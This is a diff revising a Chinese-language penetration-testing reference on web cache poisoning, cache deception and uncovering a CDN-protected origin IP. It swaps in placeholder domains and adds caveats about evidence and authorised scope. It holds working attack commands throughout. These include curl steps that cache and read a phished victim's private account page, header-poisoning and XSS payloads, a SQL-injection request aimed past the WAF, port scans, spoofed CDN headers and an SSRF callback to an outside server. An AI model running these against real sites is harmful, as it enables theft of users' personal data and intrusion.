@@ -23,7 +23,7 @@ _Web缓存投毒攻击_
 **未键入头**
 > 注入未键入头
 ```
-X-Forwarded-Host: attacker.com
+X-Forwarded-Host: collector.example.invalid
 ```
 **语法解析：**
 - `X-Forwarded-Host` — 常被用作缓存键但未包含在键中 _header_
@@ -32,18 +32,18 @@ X-Forwarded-Host: attacker.com
 > 投毒缓存
 ```
 GET /?q=test HTTP/1.1
-Host: target.com
-X-Forwarded-Host: attacker.com
+Host: target.example.invalid
+X-Forwarded-Host: collector.example.invalid
 ```
 **语法解析：**
-- `attacker.com` — 恶意主机，将被缓存 _domain_
+- `collector.example.invalid` — 恶意主机，将被缓存 _domain_
 
 **Fat GET**
 > Fat GET投毒
 ```
 GET / HTTP/1.1
-Host: target.com
-Content-Length: 10
+Host: target.example.invalid
+Content-Length: 10 (示意，须按实际 CRLF/请求体字节重新计算)
 
 q=poisoned
 ```
@@ -56,7 +56,7 @@ q=poisoned
 > 识别不包含在缓存键中但影响响应内容的HTTP头(如X-Forwarded-Host)，通过重复发送携带恶意头的请求将投毒响应存入缓存
 ```
 # 常见未键入头:
-X-Forwarded-Host: attacker.com
+X-Forwarded-Host: collector.example.invalid
 X-Forwarded-Scheme: http
 X-Original-URL: /malicious
 X-Forwarded-Prefix: /evil
@@ -84,7 +84,7 @@ X-Forwarded-Prefix: /evil
 # Fat GET投毒:
 GET /api/data HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 15
+Content-Length: <实际请求体字节长度>
 
 q=<script>alert(1)</script>
 
@@ -106,7 +106,7 @@ transfer-encoding: chunked
 # Fat GET投毒:
 GET /api/data HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 15
+Content-Length: <实际请求体字节长度>
 
 q=` — 注入代码 _value_
 - `<script>` — HTML标签/事件处理器 _tag_
@@ -146,15 +146,15 @@ _利用Web缓存和服务器路径解析的差异，诱导CDN/缓存层缓存包
 _platform: linux_
 ```
 # 检测是否存在缓存层:
-curl -sI "http://target.com/" | grep -iE "x-cache|cf-cache|age:|via:|x-cdn|cache-control"
+curl -sI "http://target.example.invalid/" | grep -iE "x-cache|cf-cache|age:|via:|x-cdn|cache-control"
 
 # 测试缓存策略(静态文件是否被缓存):
-curl -sI "http://target.com/test.css" | grep -iE "x-cache|age"
-curl -sI "http://target.com/test.js" | grep -iE "x-cache|age"
-curl -sI "http://target.com/test.jpg" | grep -iE "x-cache|age"
+curl -sI "http://target.example.invalid/test.css" | grep -iE "x-cache|age"
+curl -sI "http://target.example.invalid/test.js" | grep -iE "x-cache|age"
+curl -sI "http://target.example.invalid/test.jpg" | grep -iE "x-cache|age"
 
 # 对比动态页面:
-curl -sI "http://target.com/account" | grep -iE "x-cache|age|cache-control"
+curl -sI "http://target.example.invalid/account" | grep -iE "x-cache|age|cache-control"
 ```
 **语法解析：**
 - `X-Cache` — 缓存命中状态头(HIT/MISS) _value_
@@ -169,17 +169,17 @@ curl -sI "http://target.com/account" | grep -iE "x-cache|age|cache-control"
 # 缓存层看到 .css 扩展名，认为是静态资源并缓存
 
 # 步骤1: 构造欺骗URL(以受害者身份访问)
-curl -b "session=VICTIM_SESSION" "http://target.com/account/profile.css"
+curl -b "session=VICTIM_SESSION" "http://target.example.invalid/account/profile.css"
 
 # 步骤2: 攻击者无需认证直接访问缓存内容
-curl "http://target.com/account/profile.css"
+curl "http://target.example.invalid/account/profile.css"
 
 # 多种路径变体:
-curl "http://target.com/account/x.js"
-curl "http://target.com/account/x.jpg"
-curl "http://target.com/account/x.png"
-curl "http://target.com/api/user/info/x.css"
-curl "http://target.com/settings/x.svg"
+curl "http://target.example.invalid/account/x.js"
+curl "http://target.example.invalid/account/x.jpg"
+curl "http://target.example.invalid/account/x.png"
+curl "http://target.example.invalid/api/user/info/x.css"
+curl "http://target.example.invalid/settings/x.svg"
 ```
 **语法解析：**
 - `/account/profile.css` — 后端解析为/account但缓存层认为是CSS文件 _value_
@@ -189,20 +189,20 @@ curl "http://target.com/settings/x.svg"
 > 利用路径分隔符、参数和规范化差异的高级缓存欺骗
 ```
 # 分隔符混淆(不同组件对路径分隔符理解不同):
-curl "http://target.com/account;x.css"
-curl "http://target.com/account%23x.css"
-curl "http://target.com/account%3fx.css"
+curl "http://target.example.invalid/account;x.css"
+curl "http://target.example.invalid/account%23x.css"
+curl "http://target.example.invalid/account%3fx.css"
 
 # 参数污染:
-curl "http://target.com/account?cb=123.css"
-curl "http://target.com/account/..%2fstatic/x.css"
+curl "http://target.example.invalid/account?cb=123.css"
+curl "http://target.example.invalid/account/..%2fstatic/x.css"
 
 # RPO (Relative Path Overwrite):
-curl "http://target.com/account/..%2f..%2fstatic/style.css"
+curl "http://target.example.invalid/account/..%2f..%2fstatic/style.css"
 
 # Normalization差异:
-curl "http://target.com/account/./x.css"
-curl "http://target.com/account%2fx.css"
+curl "http://target.example.invalid/account/./x.css"
+curl "http://target.example.invalid/account%2fx.css"
 ```
 **语法解析：**
 - `;x.css` — 分号在某些框架中是路径参数分隔符 _value_
@@ -215,18 +215,18 @@ curl "http://target.com/account%2fx.css"
 # 完整攻击演示:
 
 # 1. 先确认动态页面包含敏感信息:
-curl -b "session=VALID_SESSION" "http://target.com/account" | grep -i "email|phone|address|token"
+curl -b "session=VALID_SESSION" "http://target.example.invalid/account" | grep -i "email|phone|address|token"
 
 # 2. 诱导受害者访问欺骗URL(通过钓鱼邮件/消息):
-# 受害者点击: http://target.com/account/avatar.jpg
+# 受害者点击: http://target.example.invalid/account/avatar.jpg
 # 这会将其/account页面(含个人信息)缓存为"图片"
 
 # 3. 攻击者访问同一URL获取缓存的敏感信息:
-curl "http://target.com/account/avatar.jpg"
+curl "http://target.example.invalid/account/avatar.jpg"
 # 返回受害者的账户页面(包含邮箱、手机号、地址等)
 
 # 4. 验证缓存命中:
-curl -sI "http://target.com/account/avatar.jpg" | grep -i "x-cache"
+curl -sI "http://target.example.invalid/account/avatar.jpg" | grep -i "x-cache"
 # 期望看到: X-Cache: HIT
 ```
 **语法解析：**
@@ -238,14 +238,14 @@ curl -sI "http://target.com/account/avatar.jpg" | grep -i "x-cache"
 > 利用缓存服务器与源站对分号、换行、井号等分隔符解析不一致触发缓存
 ```
 # 利用缓存服务器对路径分隔符的差异解析
-https://target.com/account/settings;.css
-https://target.com/account/settings%0a.css
-https://target.com/account/settings%23.css
-https://target.com/account/settings%3f.css
+https://target.example.invalid/account/settings;.css
+https://target.example.invalid/account/settings%0a.css
+https://target.example.invalid/account/settings%23.css
+https://target.example.invalid/account/settings%3f.css
 
 # URL编码分隔符
-https://target.com/account/settings%2f.css
-https://target.com/account/settings%5c.css
+https://target.example.invalid/account/settings%2f.css
+https://target.example.invalid/account/settings%5c.css
 ```
 **语法解析：**
 - `# 利用缓存服务器对路径分隔符的差异解析` — 主要命令 _command_
@@ -255,15 +255,15 @@ https://target.com/account/settings%5c.css
 > 利用相对路径覆盖（RPO）使浏览器请求敏感页面但缓存服务器按静态资源缓存
 ```
 # Relative Path Overwrite
-https://target.com/account/settings/..%2f..%2fstatic/style.css
-https://target.com/account/settings/nonexistent.css
+https://target.example.invalid/account/settings/..%2f..%2fstatic/style.css
+https://target.example.invalid/account/settings/nonexistent.css
 
 # 路径参数注入
-https://target.com/account/settings;param=value/test.css
-https://target.com/account/settings/test.js?_=1
+https://target.example.invalid/account/settings;param=value/test.css
+https://target.example.invalid/account/settings/test.js?_=1
 
 # 不同缓存键操控
-https://target.com/account/settings HTTP/1.1
+https://target.example.invalid/account/settings HTTP/1.1
 X-Original-URL: /static/style.css
 ```
 **语法解析：**
@@ -274,16 +274,16 @@ X-Original-URL: /static/style.css
 > 利用CDN/反向代理与源站对URL规范化处理的差异，使缓存误缓存敏感内容
 ```
 # Cloudflare/Varnish路径规范化差异
-https://target.com/account/settings/.css
-https://target.com/account/settings/test.avif
-https://target.com/account/settings/x.woff2
+https://target.example.invalid/account/settings/.css
+https://target.example.invalid/account/settings/test.avif
+https://target.example.invalid/account/settings/x.woff2
 
 # 双斜杠混淆
-https://target.com//account//settings.css
-https://target.com/account/settings%252f.css
+https://target.example.invalid//account//settings.css
+https://target.example.invalid/account/settings%252f.css
 
 # 利用Vary头缺失
-curl -H "Accept: text/css" https://target.com/account/settings
+curl -H "Accept: text/css" https://target.example.invalid/account/settings
 ```
 **语法解析：**
 - `# Cloudflare/Varnish路径规范化差异` — 主要命令 _command_
@@ -314,10 +314,10 @@ _绕过CDN查找真实IP_
 ```
 # DNS历史记录查询获取真实IP:
 # 1. SecurityTrails(需要API Key):
-curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | jq '.records[].values[].ip'
+curl -s "https://api.securitytrails.com/v1/history/target.example.invalid/dns/a"   -H "APIKEY: ${SECURITYTRAILS_API_KEY}" | jq '.records[].values[].ip'
 
 # 2. ViewDNS:
-curl -s "https://viewdns.info/iphistory/?domain=target.com"
+curl -s "https://viewdns.info/iphistory/?domain=target.example.invalid"
 
 # 3. DNS DB在线查询:
 # https://dnsdb.io/
@@ -325,14 +325,14 @@ curl -s "https://viewdns.info/iphistory/?domain=target.com"
 # https://completedns.com/
 
 # 4. Censys搜索:
-curl -s "https://search.censys.io/api/v2/hosts/search?q=target.com"   -u "API_ID:API_SECRET"
+curl -s "https://search.censys.io/api/v2/hosts/search?q=target.example.invalid"   -u "API_ID:API_SECRET"
 
 # 5. 使用FOFA:
-# domain="target.com" && type="A"
+# domain="target.example.invalid" && type="A"
 
 # 6. 多地Ping对比:
-nslookup target.com 8.8.8.8
-nslookup target.com 1.1.1.1
+nslookup target.example.invalid 8.8.8.8
+nslookup target.example.invalid 1.1.1.1
 ```
 **语法解析：**
 - `DNS` — 域名解析记录 _concept_
@@ -342,24 +342,24 @@ nslookup target.com 1.1.1.1
 ```
 # 通过邮件头泄露真实IP:
 # 1. 触发目标站点发送邮件(注册/找回密码/订阅):
-curl -d "email=attacker@gmail.com" "http://target.com/forgot-password"
-curl -d "email=attacker@gmail.com" "http://target.com/subscribe"
+curl -d "email=attacker@gmail.com" "http://target.example.invalid/forgot-password"
+curl -d "email=attacker@gmail.com" "http://target.example.invalid/subscribe"
 
 # 2. 查看收到邮件的原始头(Gmail: 显示原始邮件):
 # 查找以下字段中的IP:
-# Received: from mail.target.com (203.0.113.50)
+# Received: from mail.target.example.invalid (203.0.113.50)
 # X-Originating-IP: [203.0.113.50]
-# Return-Path: <noreply@target.com>
+# Return-Path: <noreply@target.example.invalid>
 
 # 3. 使用swaks发送邮件触发:
-swaks --to attacker@gmail.com --from test@target.com --server target.com
+swaks --to attacker@gmail.com --from test@target.example.invalid --server target.example.invalid
 
 # 4. 分析邮件头:
 # 最底部的Received字段通常包含源服务器真实IP
 
 # 5. 如果目标有RSS订阅:
 # 订阅后查看请求来源IP
-curl "http://target.com/rss" -v
+curl "http://target.example.invalid/rss" -v
 ```
 **语法解析：**
 - `Received` — 邮件传输路径 _header_
@@ -369,27 +369,27 @@ curl "http://target.com/rss" -v
 ```
 # 1. DNS历史记录查询:
 # SecurityTrails:
-curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | python3 -m json.tool
+curl -s "https://api.securitytrails.com/v1/history/target.example.invalid/dns/a"   -H "APIKEY: ${SECURITYTRAILS_API_KEY}" | python3 -m json.tool
 
 # 在线查询:
-# https://viewdns.info/iphistory/?domain=target.com
+# https://viewdns.info/iphistory/?domain=target.example.invalid
 # https://completedns.com/dns-history/
-# https://dnshistory.org/dns-records/target.com
+# https://dnshistory.org/dns-records/target.example.invalid
 
 # 2. 证书透明度日志(CT Log):
-curl -s "https://crt.sh/?q=target.com&output=json" |   python3 -c "import json,sys; [print(x['common_name'],x['name_value']) for x in json.load(sys.stdin)]"
+curl -s "https://crt.sh/?q=target.example.invalid&output=json" |   python3 -c "import json,sys; [print(x['common_name'],x['name_value']) for x in json.load(sys.stdin)]"
 
 # 3. Censys搜索:
-# https://search.censys.io/search?q=services.tls.certificates.leaf.names%3Atarget.com
+# https://search.censys.io/search?q=services.tls.certificates.leaf.names%3Atarget.example.invalid
 
 # 4. FOFA/Shodan搜索:
-# FOFA: cert="target.com"
-# Shodan: ssl.cert.subject.cn:target.com
+# FOFA: cert="target.example.invalid"
+# Shodan: ssl.cert.subject.cn:target.example.invalid
 ```
 **语法解析：**
 - `crt.sh` — 证书透明度日志搜索引擎 _value_
 - `SecurityTrails` — DNS历史记录查询API _value_
-- `cert="target.com"` — FOFA语法搜索使用特定证书的IP _parameter_
+- `cert="target.example.invalid"` — FOFA语法搜索使用特定证书的IP _parameter_
 
 **子域名与相关服务探测真实IP**
 > 通过子域名、邮件记录、主动连接等方式发现真实IP
@@ -397,16 +397,16 @@ _platform: linux_
 ```
 # 1. 子域名可能未经CDN:
 for sub in mail ftp ssh vpn dev staging test api admin mx; do
-  ip=$(dig +short ${sub}.target.com A 2>/dev/null | head -1)
-  [ -n "$ip" ] && echo "${sub}.target.com → $ip"
+  ip=$(dig +short ${sub}.target.example.invalid A 2>/dev/null | head -1)
+  [ -n "$ip" ] && echo "${sub}.target.example.invalid → $ip"
 done
 
 # 2. MX记录(邮件服务器通常不走CDN):
-dig +short target.com MX
-dig +short $(dig +short target.com MX | awk '{print $2}') A
+dig +short target.example.invalid MX
+dig +short $(dig +short target.example.invalid MX | awk '{print $2}') A
 
 # 3. SPF记录中的IP:
-dig +short target.com TXT | grep -i "spf"
+dig +short target.example.invalid TXT | grep -i "spf"
 # v=spf1 ip4:203.0.113.50 include:... → 203.0.113.50可能是真实IP
 
 # 4. 触发目标服务器主动连接:
@@ -416,10 +416,10 @@ dig +short target.com TXT | grep -i "spf"
 
 # 5. SSRF利用:
 # 如果存在SSRF漏洞，让服务器连接外部获取IP
-curl "http://target.com/api/fetch?url=http://your-server.com/log-ip"
+curl "http://target.example.invalid/api/fetch?url=http://your-server.com/log-ip"
 ```
 **语法解析：**
-- `dig +short target.com MX` — 查询邮件服务器记录，通常直接暴露真实IP _command_
+- `dig +short target.example.invalid MX` — 查询邮件服务器记录，通常直接暴露真实IP _command_
 - `SPF记录` — 邮件发送策略中包含的IP白名单 _value_
 
 **验证真实IP并直接访问**
@@ -430,27 +430,27 @@ _platform: linux_
 REAL_IP="203.0.113.50"
 
 # 直接IP访问(Host头指定域名):
-curl -sI "http://${REAL_IP}/" -H "Host: target.com"
+curl -sI "http://${REAL_IP}/" -H "Host: target.example.invalid"
 
 # HTTPS访问(忽略证书):
-curl -sk "https://${REAL_IP}/" -H "Host: target.com"
+curl --resolve "target.example.invalid:443:${REAL_IP}" "https://target.example.invalid/"
 
 # 2. 对比响应确认:
-cdn_resp=$(curl -s "https://target.com/" | md5sum)
-direct_resp=$(curl -sk "https://${REAL_IP}/" -H "Host: target.com" | md5sum)
+cdn_resp=$(curl -s "https://target.example.invalid/" | md5sum)
+direct_resp=$(curl --resolve "target.example.invalid:443:${REAL_IP}" "https://target.example.invalid/" | md5sum)
 echo "CDN: $cdn_resp"
 echo "Direct: $direct_resp"
-[ "$cdn_resp" = "$direct_resp" ] && echo "[+] CONFIRMED: Real IP!"
+[ "$cdn_resp" = "$direct_resp" ] && echo "Matching bytes only; origin ownership not established"
 
 # 3. 修改hosts绕过CDN测试:
-echo "${REAL_IP} target.com" | sudo tee -a /etc/hosts
+# 使用单次 --resolve，不修改全局 /etc/hosts
 
 # 4. 直接对真实IP进行渗透(绕过CDN的WAF):
 nmap -sV -p 1-65535 ${REAL_IP}
 # CDN的WAF通常只保护CDN入口，直接访问真实IP可绕过
 ```
 **语法解析：**
-- `-H "Host: target.com"` — 通过IP访问但指定Host头使服务器返回正确内容 _parameter_
+- `-H "Host: target.example.invalid"` — 通过IP访问但指定Host头使服务器返回正确内容 _parameter_
 - `-sk` — -s静默模式 -k忽略证书错误 _parameter_
 
 **WAF/EDR 绕过变体：**
@@ -462,21 +462,21 @@ nmap -sV -p 1-65535 ${REAL_IP}
 # 但如果目标自身也有WAF，还需要:
 
 # 1. 使用真实IP直接访问(绕过CDN WAF):
-curl -sk "https://REAL_IP/vulnerable?id=1' OR 1=1--" -H "Host: target.com"
+curl -sk "https://REAL_IP/vulnerable?id=1' OR 1=1--" -H "Host: target.example.invalid"
 
 # 2. 如果CDN仅对常见端口做WAF:
 # 扫描非标端口的Web服务:
 nmap -sV -p 8080,8443,8888,9090,3000,4443,8000 REAL_IP
 
 # 3. IPv6绕过(CDN可能只保护IPv4):
-dig +short target.com AAAA
-curl -6 "http://[IPv6_ADDRESS]/" -H "Host: target.com"
+dig +short target.example.invalid AAAA
+curl -6 "http://[IPv6_ADDRESS]/" -H "Host: target.example.invalid"
 
 # 4. 源站IP白名单探测:
 # 某些源站配置了仅允许CDN IP访问
 # 尝试伪造CDN的IP:
-curl -H "CF-Connecting-IP: 1.2.3.4" "http://REAL_IP/" -H "Host: target.com"
-curl -H "X-Forwarded-For: CDN_IP" "http://REAL_IP/" -H "Host: target.com"
+curl -H "CF-Connecting-IP: 1.2.3.4" "http://REAL_IP/" -H "Host: target.example.invalid"
+curl -H "X-Forwarded-For: CDN_IP" "http://REAL_IP/" -H "Host: target.example.invalid"
 ```
 **语法解析：**
 - `OR '1'='1'` — 逻辑永真 _keyword_
@@ -495,3 +495,12 @@ curl -H "X-Forwarded-For: CDN_IP" "http://REAL_IP/" -H "Host: target.com"
 **防御措施：** 仅允许CDN IP访问源站
 
 ---
+
+
+## 复核后的缓存证据边界
+
+缓存头/相同响应哈希不证明漏洞或源站归属。先在批准的隔离路径建立唯一 canary，核对同一 cache key 下无注入请求是否收到该标记，并验证实际 Age/命中、缓存范围、TTL 与清理；查询参数若未进入 cache key 就不能当隔离手段。不能对公共共享资源持续投毒或读取真实用户私有响应。Fat GET 示例长度是示意，HTTP/2 不允许 Transfer-Encoding: chunked，文本伪头不是实际 H2 帧。
+
+Vary 与缓存配置是否生效取决于实现；带 Cookie/Authorization 不自动禁止或允许缓存，no-cache 也不等于 no-store。后端忽略路径、按后缀缓存、UTM 排除都是待验证条件；RPO 与 cache deception 是不同机制。缓存投毒需要可缓存的可控响应，单个 X-Forwarded-Host 或普通 GET 静态文件不证明它。
+
+历史 DNS、CT 名称、邮件服务器、SPF 或出站 NAT 地址只是线索，不一定是当前 Web 源站；RSS GET 不显示源站主动连接地址。伪造 CF-Connecting-IP/XFF 只改 HTTP 头，不能改变 TCP 源 IP 或绕过网络白名单。HTTPS 用 --resolve 保持 Host/SNI 与证书验证，不默认 -k。候选 IP 的扫描、通知邮件、第三方服务查询和主动回连须各有批准范围。本次未查询目标、发送邮件或写入缓存。
